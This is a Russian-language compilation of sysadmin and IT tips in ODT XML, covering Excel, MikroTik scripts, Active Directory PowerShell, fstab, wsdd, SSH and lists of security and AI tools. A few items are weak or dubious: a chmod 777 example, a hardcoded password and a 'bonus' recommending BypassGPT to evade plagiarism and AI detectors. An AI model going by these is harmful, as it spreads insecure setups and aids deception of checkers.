      <text:p text:style-name="P26">Как быстро удалять пустые строки в Excel? Пустые строки и столбцы в таблицах Excel могут быть настоящей головной болью. Они могут запутать стандартные функции сортировки, фильтрации, подведения итогов и создания сводных таблиц, что делает работу с данными менее эффективной. Чтобы быстро удалить все пустые строки в одной таблице:</text:p>
      <text:p text:style-name="P26">1. Выделите диапазон таблицы.</text:p>
      <text:p text:style-name="P26">2. Нажмите клавишу «F5» и тапните «Выделить».</text:p>
      <text:p text:style-name="P26">3. В открывшемся окошке выберите опцию «Пустые ячейки» → «ОК».</text:p>
      <text:p text:style-name="P26">4. Выделение со всей таблицы переместится только на пустые строки таблицы.</text:p>
      <text:p text:style-name="P28">5. Нажмите клавиши «Ctrl+”-”» (знак минуса), отметьте, что хотите удалить «строки» и щелкните «ОК».</text:p>
      <text:p text:style-name="P26">ИИ + Excel/Google Docs. Часть 1. Ускоряем, облегчаем и делаем работу с Excel более приятной:</text:p>
      <text:p text:style-name="P26">1. GPTExcel - нейронка, генерирующая формулы Excel, SQL запросы и не только. </text:p>
      <text:p text:style-name="P26">2. Genius Sheets (https://www.geniussheets.com/) - делает финансовые отчеты и различные таблицы в Excel/Docs;</text:p>
      <text:p text:style-name="P26">3. Formulas HQ (https://formulashq.com/) - переводит текст в таблицы Google Docs и Excel, помогает с формулами и т.д;</text:p>
      <text:p text:style-name="P27">4. formula bot (https://formulabot.com/) - переводит ваши текстовые инструкции в Excel формулы!;</text:p>
      <text:p text:style-name="P27">5. Sheet AI (https://www.sheetai.app/) - переводит ваши текстовые инструкции в формулы Google таблиц;</text:p>
      <text:p text:style-name="P28">6. AI Excel Bot (https://aiexcelbot.com/) - новый продукт, помогает с формулами. строит таблицы и т. д.</text:p>
      <text:p text:style-name="P26">Скрипт проверки активности всех ppp-соединений Mikrotik:</text:p>
      <text:p text:style-name="P26"># если по тоннелю пинга нет, то осуществляется разрыв тоннеля для переподключения</text:p>
      <text:p text:style-name="P26"># внимание ! скрипт будет отключать активное vpn-соединение с админом, т.к. до него пинга не будет !</text:p>
      <text:p text:style-name="P26"># поэтому в скрипте сделан обход удаления данного соединения (задаётся в adminClient, должен соответствовать ppp secret)</text:p>
      <text:p text:style-name="P26">:local adminClient "you ppp secret admins` name"</text:p>
      <text:p text:style-name="P26">:local pppTest value=[/ppp active find];</text:p>
      <text:p text:style-name="P26">:local pingNumber value=2;</text:p>
      <text:p text:style-name="P26">:local pingMin value=1;</text:p>
      <text:p text:style-name="P26">:foreach userTest in=$pppTest do={</text:p>
      <text:p text:style-name="P26"><text:s/>:local pingOk value=[:ping [/ppp active get $userTest value-name=address] count=$pingNumber]</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5"><text:s/>:if (($pingOk &lt; $pingMin) &amp;&amp; ([/ppp active get $userTest value-name=name]!=$adminClient)) do={</text:span></text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>:log warning message=([/ppp active get $userTest value-name=service] . " auto disconnected: ". $pingOk . " ping ok over " . $pingNumber . " " . [/ppp active get $userTest value-name=name] . " " . [/ppp active get $userTest value-name=address])</text:p>
      <text:p text:style-name="P26">/ppp active remove $userTest</text:p>
      <text:p text:style-name="P26"><text:s/>}</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">если нужно проверять только определенный вид ppp замените строку :</text:p>
      <text:p text:style-name="P26"># :local pppTest value=[/ppp active find];</text:p>
      <text:p text:style-name="P26">на строку, например</text:p>
      <text:p text:style-name="P26"># :local pppTest value=[/ppp active find where service=pptp];</text:p>
      <text:p text:style-name="P28">Для использования поставьте этот скрипт в Планировщик с нужным интервалом (оптимально не менее 30 сек)</text:p>
      <text:p text:style-name="P26">Active Directory: утилита DCDIAG. Утилита dcdiag позволяет выполнить до 20 тестов над инфраструктурой Active Directory. Некоторые из тестов предоставляют диагностическую информацию об определенном контроллере домена. Многие тесты предоставляют информацию о конфигурации репликации в пределах леса.</text:p>
      <text:p text:style-name="P26">Advertising - Проверяет, правильно ли контроллер домена сообщает о себе и о своей роли хозяина операций. Этот тест завершиться неудачно, если служба NetLogon не запущена</text:p>
      <text:p text:style-name="P26">CheckSDRefDom - Проверяет правильность доменов ссылок дескрипторов безопасности для каждого раздела каталогов программ</text:p>
      <text:p text:style-name="P26">Connectivity - Проверяет регистрацию DNS для каждого контроллера домена, отправляет тестовый эхо-пакет на каждый контроллер домена и проверяет подключение по протоколам LDAP и RPC к каждому контроллеру домена</text:p>
      <text:p text:style-name="P27">CrossRefValidation - Проверяет правильность перекрестных ссылок для доменов</text:p>
      <text:p text:style-name="P27">RRSSysvol - проверяет состояние готовности для FRS SYSVOL</text:p>
      <text:p text:style-name="P26">FRSEvent - Проверяет ошибки репликации в работе службы репликации файлов, что может означать наличие проблем в репликации SYSVOL и, таким образом, целостности копий объектов групповых политик</text:p>
      <text:p text:style-name="P26">FSMOCheck - Не проверяет роли хозяев операций, а вместо этого запрашивает сервер глобального каталога, первичный контроллер домена, предпочтительный сервер времени, сервер времени и центр распространения ключей</text:p>
      <text:p text:style-name="P26">Intersite - Проверяет наличие ошибок, которые могут помешать нормальной репликации между сайтами. Компания Microsoft предупреждает, что иногда результаты этого теста могут оказаться неточными</text:p>
      <text:p text:style-name="P26">KCCEvent - Проверяет безошибочность создания объектов соединений для репликации между сайтами</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">KnowsOfRoleHolders - Проверяет возможность подключения контроллеров домена ко всем пяти хозяевам операций</text:span></text:p>
      <text:p text:style-name="P26">MachineAccount - Проверяет правильность регистрации учетной записи целевого компьютера и правильность объявлений служб этого компьютера. Если обнаружена ошибка, ее можно исправить с помощью утилиты dcdiag, указав параметры /fixmachineaccount или /recreatemachineaccount</text:p>
      <text:p text:style-name="P26">NCSecDesc - Проверяет правильность разрешений для репликации в дескрипторах безопасности для заголовков контекста именования</text:p>
      <text:p text:style-name="P26">NetLogons - Проверяет правильность разрешений регистрации, позволяющих регистрацию, для каждого контроллера домена</text:p>
      <text:p text:style-name="P26">ObjectsReplicated - Проверяет правильность репликации агента сервера каталогов и объектов учетных записей компьютеров</text:p>
      <text:p text:style-name="P26">OutboundSecureChannels - Проверяется наличие безопасных каналов между всеми контроллерами домена в интересующем домене</text:p>
      <text:p text:style-name="P26">Replications - Проверяет возможность репликации между контроллерами домена и сообщает обо всех ошибках при репликации</text:p>
      <text:p text:style-name="P26">RidManager - Проверяет работоспособность и доступность хозяина относительных идентификаторов</text:p>
      <text:p text:style-name="P26">Services - Проверяет работоспособность всех служб, необходимых для работы контроллера домена, на указанном контроллере домена</text:p>
      <text:p text:style-name="P26">SystemLog - Проверяет безошибочность работы системного журнала</text:p>
      <text:p text:style-name="P26">VerifyEnterpriseReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на всех контроллерах домена в лесу</text:p>
      <text:p text:style-name="P26">VerifyReferences - Проверяет действительность системных ссылок службы репликации файлов для всех объектов на указанном контроллере домена</text:p>
      <text:p text:style-name="P26">VerifyReplicas - Проверяет действительность всех разделов каталога приложения на всех серверах, принимающих участие в репликации</text:p>
      <text:p text:style-name="P28">Синтаксис команды dcdiag: dcdiag /s:&lt;DomainController&gt; [/n:&lt;NamingContext&gt;] [[/u:&lt;domain\user&gt;] [/p:&lt;password&gt;] ] [{/a|/e}{/q|/v}] [/i] [/f:&lt;LogFile&gt;] [/ferr:&lt;ErrorLog&gt;] [/c [/skip:&lt;test]] [/test:&lt;test&gt;] [/fix]</text:p>
      <text:p text:style-name="P27">Меняем пароль пользователя Active Directory с помощью PowerShell. Чтобы изменить пароль пользователя Active Directory, используйте команду Set-ADAccountPassword из модуля Active Directory для Windows PowerShell.</text:p>
      <text:p text:style-name="P27">Перед использованием командлета Set-ADAccountPassword вы должны импортировать этот модуль в сеанс PowerShell: Import-Module ActiveDirectory</text:p>
      <text:p text:style-name="P26">Пароль в памяти компьютера желательно хранить в защищенной форме, поэтому вы можете попросить администратора указать пароль следующим образом: $newPass=Read-Host "Enter the new user password" -AsSecureString</text:p>
      <text:p text:style-name="P26">Лучше указать имя учетной записи AD в виде имени samAccountname. Например, чтобы изменить пароль для пользователя jkelly, запустите команду: Set-ADAccountPassword jkelly -NewPassword $newPass</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Вы можете установить новый пароль пользователя непосредственно внутри кода скрипта: Set-ADAccountPassword jkelly–NewPassword (ConvertTo-SecureString -AsPlainText –String "St0ngPwd@d" -force)</text:span></text:p>
      <text:p text:style-name="P26">Если вы хотите, чтобы пользователь изменил пароль при следующем входе в систему, выполните команду: Set-ADUser jkelly -ChangePasswordAtLogon $True</text:p>
      <text:p text:style-name="P28">Вы можете сбросить пароль для нескольких пользователей одновременно (предположим, что имена учетных записей хранятся в текстовом файле user_to_reset.txt). Используйте этот скрипт: Get-Content C:\PS\user_to_reset.txt | Set-ADAccountPassword -NewPassword $newPass -Reset</text:p>
      <text:p text:style-name="P26">Режим временного пользователя в группе AD. В Windows Server 2016 появился полезный функционал - режим временного добавления пользователя в группу с автоматическим удалением через указанное время. Т.е. администратор может включить другого пользователя в нужную группу на пару минут для решения срочной задачи и не заботиться про то чтобы эти права у пользователя позже отозвать. Фича работает только через Powershell. С чего начать? Проверяем режим работы леса, должен быть 2016 и выше: (Get-ADForest).ForestMode. Проверяем диапазон: Get-ADOptionalFeature -filter *| select EnableScopes. И включаем функционал, внимаение - включение работает в одну сторону и его отмена невозможна: Enable-ADOptionalFeature 'Privileged Access Management Feature' -Scope ForestOrConfigurationSet -Target company.com. Теперь задаем временной интервал в минутах (можно использовать и часы -Hours) и добавляем пользователя alex в группу "Администраторы домена":</text:p>
      <text:p text:style-name="P26">$ttl = New-TimeSpan -Minutes 2</text:p>
      <text:p text:style-name="P26">Add-ADGroupMember -Identity "Администраторы домена" -Members alex -MemberTimeToLive $ttl</text:p>
      <text:p text:style-name="P28">В любой момент можем проверить сколько осталось времени до удаления пользователя из группы, смотрим на значение TTL: Get-ADGroup “Администраторы домена” -Property member –ShowMemberTimeToLive. По истечении двух минут пользователь alex будет удален из группы “Администраторы домена” автоматически. Надеюсь он успеет решить проблему за это время.</text:p>
      <text:p text:style-name="P26">Подборка бесплатных курсов для ИБ-спеца. В этом посте собрали список курсов на тематику кибербеза, которые помогут вам на пути становления белым хакером и подскажут какие перспективы вас ждут в этой области: 1. Курс по Python для OSINT специалистов: (https://github.com/cipher387/python-for-OSINT-21-days) Он бесплатный и позволит тебе автоматизировать различные рутинные задачи, связанные с исследованиями: сбор данных с веб-сайтов, сбор результатов поиска, работа с интернет-архивами, создание отчетов и визуализация данных.</text:p>
      <text:p text:style-name="P30">2. Защищенные сетевые протоколы: (https://www.youtube.com/playlist?list=PLtPJ9lKvJ4oiFnWCsVRElorOLt69YDEnv) Курс продолжает серию уроков по сетям Андрея Созыкина. В нем рассматриваются такие темы, как TLS/SSL, HTTPS. Курс полностью покрывает все аспекты защищенных сетевых протоколов. 3. Курс хакинга – Hacking: (https://www.youtube.com/playlist?list=PLrXcA7Ca3B81tWWOaGF_RjDq-9F1e5Ine) Очень полезный и простой курс для начинающих по этичному хакингу (134 урока). 4. Этичный хакинг (https://www.youtube.com/playlist?list=PLPNYkZcYUF4srO1_ZkNEnHT8Q1AI8WFaV): Во время прохождения курса вы познакомитесь с практическими приемами пентеста, взломы веб-серверов и систем, познакомитесь с LogParser и OWASP, также узнаете как проводить SQL-инъекции и даже взломаете почтовый сервер. 5. Компьютерные сети. Продвинутые темы: (https://www.youtube.com/playlist?list=PLtPJ9lKvJ4oh_w4_jtRnKE11aqeRldCFI) Курс продолжает серию уроков по сетям Андрея Созыкина. В нем рассматриваются более сложные для понимания темы сетей, поэтому сначала необходимо посмотреть первые 2 части. <text:s/>По мере прохождения данной серии продвинутых лекций вы узнаете о таких темах, как: IPv6, NDP, RIP, OSPF, протоколы маршрутизации, BGP, Web-сокеты.</text:p>
      <text:p text:style-name="P26">Основы компьютерных сетей:</text:p>
      <text:p text:style-name="P26">Тема №1. Основные сетевые термины и сетевые модели (https://habr.com/ru/post/307252/)</text:p>
      <text:p text:style-name="P26">Тема №2. Протоколы верхнего уровня (https://habr.com/ru/post/307714/)</text:p>
      <text:p text:style-name="P26">Тема №3. Протоколы нижних уровней (транспортного, сетевого и канального) (https://habr.com/ru/post/308636/)</text:p>
      <text:p text:style-name="P26">Тема №4. Сетевые устройства и виды применяемых кабелей (https://habr.com/ru/post/312340/)</text:p>
      <text:p text:style-name="P26">Тема №5. Понятие IP адресации, масок подсетей и их расчет (https://habr.com/ru/post/314484/)</text:p>
      <text:p text:style-name="P26">Тема №6. Понятие VLAN, Trunk и протоколы VTP и DTP (https://habr.com/ru/post/319080/)</text:p>
      <text:p text:style-name="P26">Тема №7. Протокол связующего дерева: STP (https://habr.com/ru/post/321132/)</text:p>
      <text:p text:style-name="P26">Тема №8. Протокол агрегирования каналов: Etherchannel (https://habr.com/ru/post/334778/)</text:p>
      <text:p text:style-name="P28">Тема №9. Маршрутизация: статическая и динамическая на примере RIP, OSPF и EIGRP (https://habr.com/ru/post/335090/)</text:p>
      <text:p text:style-name="P26">Автоматическое монтирование дисков в Linux. Чтобы автоматически подключать локальный диск при старте системы, нужно прописать его в /etc/fstab. Узнаём универсальный идентификатор диска UUID (Universally Unique Identifier):</text:p>
      <text:p text:style-name="P26">$ sudo blkid</text:p>
      <text:p text:style-name="P26">/dev/sda1: LABEL="st" UUID="36F20D4DF20D12B3" TYPE="ntfs" </text:p>
      <text:p text:style-name="P26">/dev/sda2: LABEL="SysWin" UUID="A4F20F67F20F3D54" TYPE="ntfs" </text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">/dev/sda5: UUID="1efdbdda-df38-4f60-bb2c-81996eff323c" TYPE="swap" </text:span></text:p>
      <text:p text:style-name="P26">/dev/sda6: UUID="1eab3a42-b6c3-44e5-9e18-2ff284ecfba3" TYPE="ext4" </text:p>
      <text:p text:style-name="P26">/dev/sda7: LABEL="Data" UUID="5F573D4D2CFD981F" TYPE="ntfs"</text:p>
      <text:p text:style-name="P27">Для того чтобы подключить диск Data, который является 7-м разделом с файловой системой NTFS, редактируем /etc/fstab: sudo gedit /etc/fstab &amp;. Раздел NTFS добавляем в fstab запись с соответствующим UUID:</text:p>
      <text:p text:style-name="P27">UUID=5F573D4D2CFD981F /media/5F573D4D2CFD981F ntfs-3g rw,users,locale=ru_RU.UTF-8 0 0. Можно предварительно создать каталог (скажем, WinData), куда будем монтировать диск, и присвоить ему нужные права. Так, возможно, придётся поступить, если будем расшаривать (создавать сетевой ресурс, предоставлять доступ к папкам по сети) папки с этого диска.</text:p>
      <text:p text:style-name="P26">$ sudo su</text:p>
      <text:p text:style-name="P26"># mkdir /media/WinData</text:p>
      <text:p text:style-name="P26"># chmod 777 /media/WinData</text:p>
      <text:p text:style-name="P28">Тогда добавляемая в fstab запись будет выглядеть так: UUID=5F573D4D2CFD981F /media/WinData ntfs-3g rw,users,locale=ru_RU.UTF-8 0 0. Раздел FAT и FAT32 монтируем в каталог /media/Patition-FAT32, добавляя запись: UUID=номер_UUID /media/Patition-FAT32 vfat shortname=mixed,codepage=850,umask=002,uid=1000,gid=100,noauto,user 0 0. Раздел Ext4 монтируем в каталог /media/Ubuntu20: UUID=номер_UUID /media/Ubuntu20 ext4 rw,users 0 0. <text:s/>Теперь после перезагрузки указанные в fstab диски будут автоматически примонтированы и доступны для приложений.</text:p>
      <text:p text:style-name="P26">Скрипты для диагностики DNS:</text:p>
      <text:p text:style-name="P26">https://github.com/m0zgen/dns-tester - Тестирование скорости ответа DNS со статистикой превышения, минимума, максимума;</text:p>
      <text:p text:style-name="P26">https://github.com/m0zgen/bench-dns - Простой скрипт для тестирования загрузки DNS. Написан на языке Go;</text:p>
      <text:p text:style-name="P26">https://github.com/m0zgen/check-dns-servers - Проверка DNS - Дата сертификата, DNS resolve, HTTP 200;</text:p>
      <text:p text:style-name="P26">https://github.com/m0zgen/mac-dns - Очистка кэша DNS и настройка DNS IP сервисов - Google, Cloudflare, BLD;</text:p>
      <text:p text:style-name="P28">https://github.com/m0zgen/bld-lookup - Соберите все IP-адреса DNS BLD и попытайтесь разрешить целевой домен с каждым IP BLD.</text:p>
      <text:p text:style-name="P28">ElevenLabs выкатили бесплатную нейросеть для генерации любых звуков по текстовому описанию. Можно создавать в том числе музыку, речь, пение птиц, звуки хруста костей, свиста, ядерного взрыва - elevenlabs.io/app/sound-effects</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T5">Включаем отображение Samba-сервера в сетевом окружении Windows. В последних версиях Windows samba сервера больше не отображаются в сетевом окружении, при этом они нормально работают при прямом подключении к ним. Это связано с полным отказом в Windows протокола SMB1 и невозможностью обнаружить Samba по протоколу NetBIOS. Современные Windows системы </text:span><text:soft-page-break/><text:span text:style-name="T5">используют для обнаружения устройств WSD (Web Services for Devices) и сегодня мы расскажем, как добавить его поддержку для вашего сервера Samba. Для включения поддержки WSD нам потребуется пакет wsdd, который штатно присутствует в репозиториях Debian 12 и Ubuntu 22.04, если вы используете другие версии систем, то вам потребуется подключить репозиторий разработчиков, он поддерживает Debian 9 - 11, и Ubuntu 16.04 - 22.04. Чтобы подключить репозиторий разработчиков сначала скачайте и импортируйте в хранилище ключ: wget -O- https://pkg.ltec.ch/public/conf/ltec-ag.gpg.key | gpg --dearmour &gt; /usr/share/keyrings/wsdd.gpg.</text:span></text:p>
      <text:p text:style-name="P27">Теперь подключим сам репозиторий: echo "deb [signed-by=/usr/share/keyrings/wsdd.gpg] https://pkg.ltec.ch/public/ `lsb_release -cs` main" &gt; /etc/apt/sources.list.d/wsdd.list. Обновим список пакетов и установим нужную нам службу:</text:p>
      <text:p text:style-name="P26">apt update</text:p>
      <text:p text:style-name="P26">apt install wsdd</text:p>
      <text:p text:style-name="P26">Пакет будет автоматически добавлен в автозагрузку и нам останется только запустить его и проверить статус:</text:p>
      <text:p text:style-name="P26">systemctl start wsdd</text:p>
      <text:p text:style-name="P26">systemctl status wsdd</text:p>
      <text:p text:style-name="P26">По умолчанию служба работает на всех интерфейсах и протоколах, если мы хотим изменить данное поведение, то следует добавить необходимые опции в файл /etc/default/wsdd, в нем находится единственная допустимая опция: WSDD_PARAMS="". В ней мы должны указать все необходимые параметры запуска согласно документации.</text:p>
      <text:p text:style-name="P28">Так, например, если мы хотим ограничить работу службы только интерфейсом ens33 и протоколом IPv4, то добавим: WSDD_PARAMS="--interface ens33 --ipv4only". Либо: WSDD_PARAMS="-i ens33 -4". Короткая запись проще, но не такая информативная, поэтому в конфигурационном файле мы бы советовали придерживаться длинной. После внесения изменений в настройки службу следует перезапустить: systemctl restart wsdd. Для нормальной работы службы вам также нужно разрешить в брандмауэре входящие соединения для UDP 3702 и TCP 5357. Cо стороны Windows делать ничего не нужно, Samba-сервера автоматически появятся в вашем сетевом окружении.</text:p>
      <text:p text:style-name="P26">Определяем контент, созданный нейросетями. Full Pack:</text:p>
      <text:p text:style-name="P26">1. Buster AI <text:s/>(https://aiinfinity.blogspot.com/p/ai-detection-busterai.html) - проверяет написан ли текст нейросетями:</text:p>
      <text:p text:style-name="P26">2. Detect GPT (https://chromewebstore.google.com/detail/detectgpt-detect-chat-gpt/oadkgbgppkhoaaoepjbcnjejmkknaobg) - браузерное расширение с говорящим названием;</text:p>
      <text:p text:style-name="P26">3. GLTR AI Detection (http://gltr.io/) - еще один мощный инструмент определения текста;</text:p>
      <text:p text:style-name="P26">4. GPTZero <text:s/>(https://gptzero.me/) - не раз упомянутый мной инструмент для работы с текстом;</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">5. AI Text Classifier (https://platform.openai.com/ai-text-classifier) - определяет текст, написанный моделями ChatGPT;</text:span></text:p>
      <text:p text:style-name="P26">6. Originality (https://originality.ai/) - серьезный детектор плагиата и использования нейросетей;</text:p>
      <text:p text:style-name="P26">7. Illuminarty (https://illuminarty.ai/en/) - определяет картинку или текст посредством сравнительного анализа;</text:p>
      <text:p text:style-name="P26">8. AI or Not (https://www.aiornot.com/) - определит картинку, видео или запись голоса;</text:p>
      <text:p text:style-name="P26">9. Writer <text:s/>(https://writer.com/ai-content-detector/) - еще один неплохой детектор текста. написанного нейросетями:</text:p>
      <text:p text:style-name="P26">10. ZeroGPT <text:s/>(https://www.zerogpt.com/) - определяет текст, написанный моделями OpenAI;</text:p>
      <text:p text:style-name="P27">11. V7 Deepfake Detector <text:s/>(https://www.v7labs.com/news/v7-releases-deep-fake-detector-for-chrome) - определяет дипфейки, можно запросить демо версию;</text:p>
      <text:p text:style-name="P27">12. GPTZero Online <text:s/>(https://etedward-gptzero-main-zqgfwb.streamlit.app/) - лайт версия GPTZero;</text:p>
      <text:p text:style-name="P26">13. QuillBot (https://quillbot.com/ai-content-detector) - новый инструмент определения текста;</text:p>
      <text:p text:style-name="P26">14. Scibbr <text:s/>(https://www.scribbr.com/ai-detector/) - еще один минималистичный он-лайн детектор;</text:p>
      <text:p text:style-name="P28">Бонус: BypassGPT (https://bypassgpt.ai/) - рерайт/антидетект ИИ на стеройдах. Поможет обойти большинство программ антиплагиата и детекта.</text:p>
      <text:p text:style-name="P26">Примеры скриптов для Mikrotik. Проверка изменения IP-адреса интерфейса для Mikrotik. Иногда провайдер выдает динамические IP-адреса. Этот скрипт проверит, не изменился ли динамический IP-адрес.</text:p>
      <text:p text:style-name="P26">:global currentIP;</text:p>
      <text:p text:style-name="P26">:local newIP [/ip address get [find interface="ether1"] address];</text:p>
      <text:p text:style-name="P26">:if ($newIP != $currentIP) do={</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>:put "ip address $currentIP changed to $newIP";</text:p>
      <text:p text:style-name="P26"><text:s text:c="4"/>:set currentIP $newIP;</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Netmask. Этот скрипт полезен, если вам нужен ip-адрес без netmask (например, чтобы использовать его в брандмауэре), а "/ip address get [id] address" возвращает ip-адрес и netmask.</text:p>
      <text:p text:style-name="P26">:global ipaddress 10.1.101.1/24</text:p>
      <text:p text:style-name="P26">:for i from=( [:len $ipaddress] - 1) to=0 do={ </text:p>
      <text:p text:style-name="P26"><text:s/>:if ( [:pick $ipaddress $i] = "/") do={ </text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>:put [:pick $ipaddress 0 $i]</text:p>
      <text:p text:style-name="P26"><text:s/>} </text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Резолвим имя хоста. Многие пользователи спрашивают, как использовать dns-имена вместо IP-адресов для серверов radius, правил брандмауэра и т.д. Вот пример того, как резовлить IP-адрес сервера RADIUS. Допустим, у нас настроен сервер radius:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">/radius </text:span></text:p>
      <text:p text:style-name="P26">add address=3.4.5.6 comment=myRad</text:p>
      <text:p text:style-name="P26">А вот скрипт, который резовлит ip-адрес, сравнит ip с настроенным и заменит, если они не равны:</text:p>
      <text:p text:style-name="P26">/system script add name="resolver" source= {</text:p>
      <text:p text:style-name="P26">:local resolvedIP [:resolve "server.example.com"];</text:p>
      <text:p text:style-name="P26">:local radiusID [/radius find comment="myRad"];</text:p>
      <text:p text:style-name="P26">:local currentIP [/radius get $radiusID address];</text:p>
      <text:p text:style-name="P26">:if ($resolvedIP != $currentIP) do={</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>/radius set $radiusID address=$resolvedIP;</text:p>
      <text:p text:style-name="P26"><text:s text:c="3"/>/log info "radius ip updated";</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">}</text:p>
      <text:p text:style-name="P26">Добавьте этот скрипт в планировщик, чтобы он выполнялся, например, каждые 5 минут:</text:p>
      <text:p text:style-name="P25">/system scheduler add name=resolveRadiusIP on-event="resolver" interval=5m</text:p>
      <text:p text:style-name="P27">Подборка идентификаторов сетевых вторжений. IDS/IPS - системы обнаружения и предотвращения вторжений, которые обеспечивают детальный мониторинг сетевой активности, выявление аномалий и реагирование на потенциальные угрозы в реальном времени:</text:p>
      <text:p text:style-name="P26">1. Stealth (https://fbb-git.gitlab.io/stealth/): (https://fbb-git.gitlab.io/stealth/) проверка целостности файлов, которая практически не оставляет следов. Контроллер запускается с другого компьютера, что затрудняет злоумышленнику получение информации о том, что файловая система проверяется через определенные псевдослучайные интервалы времени по SSH</text:p>
      <text:p text:style-name="P26">2. AIEngine (https://aiengine.readthedocs.io/en/latest/aiengine.html): (https://aiengine.readthedocs.io/en/latest/aiengine.html) это интерактивный, программируемый движок проверки пакетов с функциями NIDS (Network Intrusion Detection System), классификацией доменов DNS, сборщиком сетевых данных, сетевой экспертизой и многими другими</text:p>
      <text:p text:style-name="P26">3. Fail2Ban (http://www.fail2ban.org/wiki/index.php/Main_Page): (http://www.fail2ban.org/wiki/index.php/Main_Page) инструмент для сканирования файлов журналов и выполнения ряда действия с IP-адресами, которые демонстрируют вредоносное поведение</text:p>
      <text:p text:style-name="P26">4. Denyhosts (http://denyhosts.sourceforge.net/): (http://denyhosts.sourceforge.net/) инструмент для предотвращения атак на основе словаря SSH и атак методом перебора</text:p>
      <text:p text:style-name="P28">5. SSHGuard (http://www.sshguard.net/): (http://www.sshguard.net/) защищает хосты от атак грубой силы, отслеживает файлы системных журналов</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">SOC: инструменты для управления киберугрозами. Инструменты SOC помогают организациям отслеживать угрозы безопасности и быстро реагировать на них в режиме реального времени. SIEM (Security information and </text:span><text:soft-page-break/><text:span text:style-name="T5">event management) - это класс программных продуктов, предназначенных для сбора и анализа информации о событиях безопасности</text:span></text:p>
      <text:p text:style-name="P26">1. McAfee Enterprise Security Manager (ESM) (https://www.esecurityplanet.com/products/mcafee-enterprise-security-manager-esm/): (https://www.esecurityplanet.com/products/mcafee-enterprise-security-manager-esm/) это инструмент SIEM, используемый для обнаружения угроз в режиме реального времени, ведения журналов и составления отчетов о соответствии требованиям</text:p>
      <text:p text:style-name="P26">2. Palo Alto Networks (https://www.paloaltonetworks.com/): (https://www.paloaltonetworks.com/) это платформа безопасности, которая сочетает в себе сетевую, конечную и облачную безопасность для предотвращения кибератак</text:p>
      <text:p text:style-name="P27">3. Splunk Enterprise Security (https://splunkbase.splunk.com/app/263): (https://splunkbase.splunk.com/app/263) инструмент SIEM используется для мониторинга в режиме реального времени, обнаружения угроз и реагирования на инциденты. Генерирует оповещения для дополнительного расследования, используя расширенные возможности корреляции и аналитики, чтобы выявлять закономерности сомнительного поведения</text:p>
      <text:p text:style-name="P27">4. IBM QRadar (https://www.ibm.com/qradar?ysclid=m12c99koag789300988): (https://www.ibm.com/qradar?ysclid=m12c99koag789300988) инструмент SIEM, используемый для управления журналами, мониторинга сети и активности пользователей, а также анализа угроз. Автоматизирует процессы обнаружения угроз и реагирования с использованием методов машинного обучения и искусственного интеллекта</text:p>
      <text:p text:style-name="P28">5. Elastic Security (https://www.elastic.co/security): (https://www.elastic.co/security) Это платформа анализа безопасности и обнаружения угроз с открытым исходным кодом, использующая алгоритмы машинного обучения. Масштабируемость - одно из лучших качеств Elastic Security</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T5">Запуск команд на удаленном компьютере через SSH-подключение. Протокол SSH, помимо работы в интерактивном режиме, поддерживает также разовый запуск команд или скриптов на удаленном компьютере под управлением ОС семейства Linux. Синтаксис команды запуска удаленной команды: ssh [пользователь]@[сервер] '[команда]'. Если доступ по ssh реализован по ключевой паре, то команда выполнится немедленно. Если нет, то при запросе вводим пароль указанного пользователя и в консоли получаем вывод команды, если таковой имеется. Например, получим информацию об установленной на удаленном сервере операционной системе: ssh my_name@192.168.1.77 'uname -a'. Чтобы запустить несколько команд за одно подключение, можно использовать символ “;” в качестве разделителя. Проверим время работы удаленного компьютера, его загрузку и запросим все активные сетевые подключения на удаленном компьютере: ssh <text:s/>my_name@192.168.1.77 'uptime; netstat -anp tcp'. В случае, если потребуется запустить на удаленном сервере локальный файл скрипта, то потребуется в SSH-подключении вызвать </text:span><text:soft-page-break/><text:span text:style-name="T5">командный интерпретатор в режиме исполнения сценария (например, bash с ключом -s), и на стандартный ввод передать ему файл скрипта. Команда запуска локального скрипта на удаленном компьютере будет выглядеть примерно так: ssh <text:s/>my_name@192.168.1.77 'bash -s' &lt; /home/user/anycript.sh. В результате скрипт в локальном файл /home/user/anyscript.sh исполнится на удаленном сервере.</text:span></text:p>
      <text:p text:style-name="P26">Gamer Starter Pack. V1:</text:p>
      <text:p text:style-name="P26">2. itch.io - это открытая торговая площадка для авторов, специализирующаяся на инди-играх;</text:p>
      <text:p text:style-name="P26">3. Game Jolt <text:s/>(https://gamejolt.com/games) - вторая по популярности площадка для инди-игр;</text:p>
      <text:p text:style-name="P26">4. Acid Play <text:s/>(https://acid-play.com/hottest) - <text:s/>сборник игр для олдфагов, например, Icy Tower, Chicken Invaders, Bomberman и т.д.</text:p>
      <text:p text:style-name="P26">5. MegaGame <text:s/>(https://megagames.com/) - олдовый сайт с репаками игр и различными модами;</text:p>
      <text:p text:style-name="P26">6. NexusMods (https://www.nexusmods.com/) - топовая мастерская модов для большинства популярных игр;</text:p>
      <text:p text:style-name="P25">7. shadps4-emu (http://github.com/shadps4-emu) - эмулятор игр для PlayStation 4 на ПК. Через него можно запустить BloodBorne и не только.</text:p>
